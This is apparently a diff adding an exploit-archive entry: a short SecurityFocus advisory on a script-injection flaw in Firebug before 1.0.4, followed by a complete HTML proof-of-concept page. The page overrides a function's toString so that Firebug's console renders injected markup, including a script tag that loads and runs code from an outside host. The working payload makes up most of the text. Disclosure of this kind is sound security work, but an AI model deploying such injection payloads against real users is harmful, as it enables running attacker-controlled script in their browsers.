@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/23349/info
+
+Firebug is prone to a script-code-injection vulnerability because it fails to adequately escape user-supplied data.
+
+An attacker can exploit this issue to execute arbitrary script code in the context of the application.
+
+Versions prior to 1.04 are vulnerable. 
+
+<html> <head> <title>Firebug console HTML injection</title> <style> noscript, .nofirebug{ color: red } </style> </head> <body> <h1>Firebug console HTML injection</h1> <script type="text/javascript"> // A function that returns a specially formatted string function vulnstring(){ return 'function <b style="font-size:80px">foo(<script src="http://larholm.com/vuln/firebuginclude.js"></'+'script>) { }'; } // The function object to log with Firebug var a = function(){}; // Overwrite the default toString method a.toString = vulnstring; // Attempt to trigger the vulnerability if Firebug is installed and has console logging enabled if(typeof console!="undefined" && typeof console.log=="function"){ console.log(a); document.write('<p>Check your Firebug console output. If it says Foo() in very large letters and you get an alert then you are vulnerable and should upgrade to Firebug v1.0.4 or greater.</p>'); } else { // Show error document.write('<p class="nofirebug">This proof of concept exploit requires Firebug to work</p>'); } </script> <noscript><p>This proof of concept exploit requires that Javascript is enabled.</p></noscript> <h3>Cheers, <a href="http://larholm.com/">Thor Larholm</a></h3> </body></html> 
